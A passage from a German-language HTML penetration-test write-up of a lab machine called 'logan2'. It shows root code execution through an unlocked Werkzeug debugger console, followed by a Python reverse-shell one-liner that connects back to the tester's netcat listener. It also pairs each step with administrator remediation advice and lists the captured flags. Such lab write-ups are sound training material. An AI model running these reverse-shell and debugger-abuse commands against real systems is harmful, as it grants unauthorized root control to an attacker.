+                <p class="analysis"><strong>Analyse:</strong> Dieses Bild zeigt die standardmäßige Ansicht der Werkzeug Debugger Konsole, wenn sie passwortgeschützt ist. Sie visualisiert die Hürde, die mit dem erhaltenen PIN <code>428-583-209</code> überwunden werden kann. Man sieht das Eingabefeld für den PIN und die Meldung 'Console Locked'. Für Laien: Das ist das 'Schloss' des geheimen Zugangs, das eine Nummer (PIN) verlangt, um sich zu öffnen. Für Experten: Die Ansicht des gesperrten Debuggers ist der erwartete Zustand vor Eingabe des PINs. Sie bestätigt die Notwendigkeit der Authentifizierung zur Erlangung der RCE-Fähigkeit.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Die visuelle Darstellung der gesperrten Konsole unterstreicht den Schritt, der als Nächstes erfolgen wird: die Eingabe des gefundenen PINs.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gib den PIN in das Feld ein.<br><strong>Empfehlung (Admin):</strong> Dieser Bildschirm sollte in Produktionsumgebungen niemals erreichbar sein.</p>
+
+
+                <div class="code-block">
+                     <div class="terminal">
+                          <pre><span class="password">http://192.168.2.35:8000/console</span>
+
+<span class="password">[console ready]</span>
+<span class="metasploit-prompt">>>> </span></pre>
+                     </div>
+                 </div>
+                <p class="analysis"><strong>Analyse:</strong> Nach erfolgreicher Eingabe des PINs wird die Debugger-Konsole entsperrt. Diese Ausgabe zeigt die Benutzeroberfläche der freigeschalteten interaktiven Python-Konsole, erkennbar am Prompt <code>>>></code>. Hier kann Python-Code direkt eingegeben und ausgeführt werden. Da die Flask-Anwendung, die diesen Debugger hostet, mit Root-Rechten gestartet wurde (via sudo), wird jeder über diese Konsole ausgeführte Befehl ebenfalls mit Root-Berechtigungen laufen. Für Laien: Nach Eingabe der geheimen Nummer hat sich der 'Geheimzugang' geöffnet, und ich sehe jetzt ein Feld, in das ich Befehle (in der 'Python-Sprache') eingeben kann. Weil der Zugang als Super-Administrator (root) geöffnet wurde, haben meine Befehle jetzt volle Kontrolle über den Computer. Für Experten: Das Erscheinen des interaktiven Python-Prompts signalisiert die erfolgreiche Umgehung der PIN-Authentifizierung und die Erlangung von Remote Code Execution mit Root-Berechtigungen. Dies ist der Punkt, an dem die Privilegien-Eskalation abgeschlossen ist und der vollständige Systemkompromiss erreicht wurde.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff über die Werkzeug Debugger Konsole ist erfolgreich. Ich habe RCE mit Root-Berechtigungen. Dies ist das Ende der Privilegien-Eskalationskette.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde diese Root-Shell nutzen, um die Root-Flag zu finden und den Test abzuschließen. Typischerweise werde ich eine stabilere Reverse Shell von hier aus initiieren, um die Interaktion zu vereinfachen.<br><strong>Empfehlung (Admin):</strong> Dies ist eine extrem kritische Schwachstelle. Ein Angreifer hat vollen Systemzugriff erlangt. Deaktivieren Sie den Debugger umgehend, entfernen Sie die unsichere Sudo-Regel und untersuchen Sie das System auf weitere Kompromittierungsindikatoren.</p>
+
+                 <p><strong>Risikobewertung:</strong></p>
+                 <p class="evaluation">Die Kombination einer NOPASSWD-Sudo-Regel für ein Skript, das einen Root-Debugger mit offenem PIN startet, stellt ein <strong>kritisches Risiko</strong> dar. Dies ermöglichte einem Low-Privilege-Benutzer (git) die direkte Erlangung von Root Code Execution ohne jegliche weitere Interaktion oder Schwachstelle im Skript selbst. Ein Angreifer mit Zugriff auf den Benutzer 'git' (den ich über Gitea RCE erlangt habe) kann so die volle Kontrolle über das System übernehmen, sensible Daten stehlen, die Integrität des Systems gefährden und eine dauerhafte Präsenz etablieren.</p>
+
+                 <p><strong>Empfehlungen zur Behebung:</strong></p>
+                 <p class="recommendation"><strong>Empfehlung (Admin):</strong></p>
+                 <ul>
+                     <li><strong>Überprüfen und Entfernen unsicherer Sudo-Regeln:</strong> Entfernen Sie die Regel <code>(ALL) NOPASSWD: /usr/bin/python3 /opt/app.py</code> aus der <code>/etc/sudoers</code> Datei. Wenden Sie das Prinzip der geringsten Rechte an.</li>
+                     <li><strong>Deaktivieren Sie den Werkzeug Debugger:</strong> Stellen Sie sicher, dass der Debug-Modus in Produktionsumgebungen deaktiviert ist und der Werkzeug Debugger nicht aktiv wird.</li>
+                     <li><strong>Verhindern Sie die PIN-Offenlegung:</strong> Ändern Sie das Skript <code>/opt/app.py</code> so, dass es den Debugger-PIN nicht im Standard-Output ausgibt, falls der Debugger doch aktiv sein muss (was in Produktion vermieden werden sollte).</li>
+                     <li><strong>Überprüfen Sie Dateiberechtigungen:</strong> Stellen Sie sicher, dass sensible Skripte (wie <code>/opt/app.py</code>) nur für Root lesbar und ausführbar sind und nicht von normalen Benutzern eingesehen oder manipuliert werden können.</li>
+                     <li><strong>Umfassende Protokollierung und Überwachung:</strong> Überwachen Sie die Ausführung von Befehlen über <code>sudo</code> und das Starten von Diensten auf ungewöhnlichen Ports (wie 8000).</li>
+                     <li><strong>Gitea-Update:</strong> Aktualisieren Sie Gitea, um die RCE-Schwachstelle für authentifizierte Benutzer zu schließen, die den Initial Access ermöglichte.</li>
+                     <li><strong>LFI-Fix:</strong> Beheben Sie die LFI-Schwachstelle auf der Subdomain, die zur Kompromittierung der Gitea-Anmeldedaten führte.</li>
+                 </ul>
+            </section>
+
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="metasploit-prompt">[console ready]</span>
+<span class="metasploit-prompt">>>> </span><span class="command">__import__('os').popen('id').read();</span>
+<span class="password">'uid=0(root) gid=0(root) groups=0(root)\n'</span>
+<span class="metasploit-prompt">>>> </span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> In der freigeschalteten Werkzeug Debugger Konsole (die mit Root-Rechten läuft) führe ich einen einfachen Python-Befehl aus, um die aktuellen Benutzerberechtigungen zu überprüfen: <code>__import__('os').popen('id').read();</code>. Dieser Code importiert das <code>os</code> Modul, ruft die Funktion <code>popen()</code> auf, um den Systembefehl <code>id</code> auszuführen, und liest dessen Ausgabe. Die Ausgabe <code>'uid=0(root) gid=0(root) groups=0(root)\n'</code> bestätigt eindeutig, dass der Code mit Root-Berechtigungen (UID 0) ausgeführt wird. Für Laien: In dem 'Geheimzugangsprogramm' (Debugger) habe ich einen Befehl eingegeben, der den Computer fragt, wer er ist, wenn er diesen Befehl ausführt. Und er hat geantwortet: 'Ich bin der Super-Administrator (root)!'. Für Experten: Die erfolgreiche Ausführung des <code>id</code>-Befehls über die Debugger-Konsole und die Rückgabe von UID 0 ist der finale Beweis für Root Code Execution. Der gewählte Befehl <code>__import__('os').popen('id').read()</code> ist eine gängige Methode, um Systembefehle über die Python-Konsole auszuführen und deren Ausgabe zu erfassen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff über die Werkzeug Debugger Konsole ist vollständig nachgewiesen. Ich habe eine interaktive Umgebung, in der ich Befehle mit Root-Berechtigungen ausführen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe nun volle Kontrolle über das System. Mein nächstes Ziel ist es, eine stabilere Root-Shell zu erhalten und die Root-Flag zu finden.<br><strong>Empfehlung (Admin):</strong> Diese Schwachstelle ermöglichte die Erlangung von Root-Rechten. Alle zuvor genannten Behebungsempfehlungen für die Sudo-Regel und den Debugger sind kritisch.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4448</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4448 ...</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Um eine stabilere Root-Shell zu erhalten, starte ich einen Netcat-Listener auf meinem Kali-System auf Port 4448. Ich verwende den Befehl <code>nc -lvnp 4448</code>. Die Flags bedeuten: <code>-l</code> (listen), <code>-v</code> (verbose), <code>-n</code> (numeric only), <code>-p 4448</code> (Port 4448). Die Ausgabe <code>listening on [any] 4448 ...</code> zeigt, dass der Listener erfolgreich gestartet wurde und auf eingehende Verbindungen auf Port 4448 wartet. Für Laien: Ich öffne eine neue 'Telefonleitung' (Port 4448) auf meinem Computer, um auf einen Anruf vom Zielcomputer zu warten. Dieser Anruf wird mir dann den direkten 'Admin-Zugang' (Root-Shell) verschaffen. Für Experten: Die Einrichtung eines Listeners ist der vorbereitende Schritt zum Empfang einer Reverse Shell vom Zielsystem. Ein separater Port (4448) wird verwendet, um Konflikte mit anderen Listenern zu vermeiden (z.B. dem vorherigen auf 4444 für die git-Shell).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Listener ist bereit. Ich bin nun in der Lage, eine Root-Reverse-Shell vom Zielsystem aus zu initiieren, indem ich einen Befehl über die Root-Debugger-Konsole ausführe, der eine Verbindung zu diesem Listener herstellt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun einen Befehl in der Root-Debugger-Konsole ausführen, der eine Reverse Shell zum Listener auf <code>192.168.2.199:4448</code> initiiert. Dies wird mir eine stabile, interaktive Root-Shell auf meinem Kali-System verschaffen.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Netzwerkverbindungen von Systemen, insbesondere auf hohe oder ungewöhnliche Ports, um Reverse Shells zu erkennen. Implementieren Sie Netzwerksegmentierung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="metasploit-prompt">[console ready]</span>
+<span class="metasploit-prompt">>>> </span><span class="command">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.199",4448));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> In der Root-Debugger-Konsole auf Port 8000 führe ich einen Python-Code aus, der eine Reverse Shell initiiert. Der Code ist <code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.199",4448));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);</code>. Dieser Code erstellt einen Socket, verbindet ihn zu meinem Kali-System (<code>192.168.2.199</code>) auf Port 4448 (wo mein Netcat-Listener lauscht), dupliziert die Standard-Input/Output/Error-File-Deskriptoren, um sie auf diesen Socket umzuleiten, und startet dann eine interaktive Bash-Shell (<code>/bin/bash -i</code>), deren Ein- und Ausgabe über die Netzwerkverbindung zu meinem Kali-System läuft. Da dieser Code über die Root-Debugger-Konsole ausgeführt wird, läuft er mit Root-Berechtigungen. Für Laien: In dem 'Geheimzugangsprogramm' (Debugger) sage ich dem Computer in 'Python-Sprache': 'Rufe meinen Computer auf der 'Telefonleitung' 4448 an, und leite dann alles, was du normalerweise auf dem Bildschirm zeigst oder was ich dir über die Tastatur eingebe, über diese 'Telefonleitung' um. Dann starte ein 'Befehlsprogramm' (Bash-Shell).' Für Experten: Dies ist ein Standard-Python-Code-Snippet zur Erzeugung einer Reverse Shell. Die Ausführung dieses Codes über die Root-Debugger-Konsole ermöglicht die Transition von RCE zu einer stabilen, interaktiven Shell, die für die weitere Post-Exploitation komfortabler ist. Die Verwendung von <code>subprocess.call(["/bin/bash","-i"])</code> ist eine gängige Methode zum Starten einer interaktiven Shell.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl zur Initiierung der Root-Reverse-Shell ist korrekt konstruiert. Seine Ausführung in der Root-Debugger-Konsole sollte mir sofort eine Root-Shell auf meinem Kali-Listener verschaffen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich führe diesen Befehl in der Konsole aus und warte auf die eingehende Verbindung auf meinem Netcat-Listener auf Port 4448. Sobald die Verbindung steht, habe ich eine interaktive Root-Shell.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Ausführung von Systembefehlen über Debugger oder andere RCE-Vektoren. Implementieren Sie Application Whitelisting, um die Ausführung unbekannter oder bösartiger Skripte oder Binaries zu verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4448</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4448 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.35] 55736</span>
+<span class="command">bash: initialize_job_control: no job control in background: Bad file descriptor</span>
+<span class="command">bash: no job control in this shell</span>
+<span class="password">root@logan2:/home/git#</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich zeige erneut die Ausgabe meines Netcat-Listeners auf Port 4448 auf meinem Kali-System. Nach der Ausführung des Python-Reverse-Shell-Codes in der Root-Debugger-Konsole empfängt mein Listener eine Verbindung vom Zielsystem (<code>connect to [192.168.2.199] from (UNKNOWN) [192.168.2.35] 55736</code>). Nach den typischen Meldungen für eine einfache Netcat-Shell (<code>bash: cannot set terminal process group...</code>) erscheint der Shell-Prompt <code>root@logan2:/home/git#</code>. Das Hashtag (<code>#</code>) am Ende des Prompts ist die Standardanzeige für eine Root-Shell auf Linux-Systemen. Der Prompt zeigt auch den Hostnamen (<code>logan2</code>) und das aktuelle Verzeichnis (<code>/home/git</code>, das Startverzeichnis des Gitea-Benutzers, von wo aus wahrscheinlich das Python-Skript gestartet wurde, bevor es die Shell übergab). Für Laien: Mein Computer hat den Anruf vom Zielcomputer auf 'Telefonleitung' 4448 entgegengenommen, und jetzt sehe ich ein 'Befehlsfenster' (Shell) vom Zielcomputer direkt auf meinem Bildschirm. Und fantastisch – das Zeichen am Ende (<code>#</code>) zeigt, dass ich jetzt der Super-Administrator (root) bin! Ich habe volle Kontrolle! Für Experten: Der erfolgreiche Empfang der Reverse Shell auf Port 4448 mit dem Root-Prompt (<code>#</code>) ist der definitive Beweis für die erfolgreiche Privilegien-Eskalation auf Root-Ebene. Ich habe nun eine stabile, interaktive Root-Shell auf dem Zielsystem.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Root-Zugriff ist etabliert. Ich habe eine Root-Shell auf dem Zielsystem erhalten. Dies ist der volle Systemkompromiss.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mein Ziel ist erreicht. Ich werde nun die Root-Flag finden und den Test abschließen. Das System steht mir mit Root-Rechten vollständig zur Verfügung.<br><strong>Empfehlung (Admin):</strong> Dies ist die schwerwiegendste Kompromittierung. Das System hat Root-Rechte verloren. Nehmen Sie das System sofort vom Netz, führen Sie eine forensische Analyse durch, identifizieren Sie die genaue Ursache der Sudo-Fehlkonfiguration und des Debugger-Problems, patchen Sie das System und stellen Sie es von einem sicheren Backup wieder her. Implementieren Sie umfassende Sicherheitsmaßnahmen, um zukünftige Kompromittierungen zu verhindern.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <!-- Einzelne Flags werden hier im korrigierten Format eingefügt -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/logan/user.txt</div>
+                    <div class="flag-value"><span class="password">User Flag: 24671329416324134234</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">Root flag: 1290381293128301a</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 10. Juni 2025</p>
+    </footer>
+
+</body>
+</html>
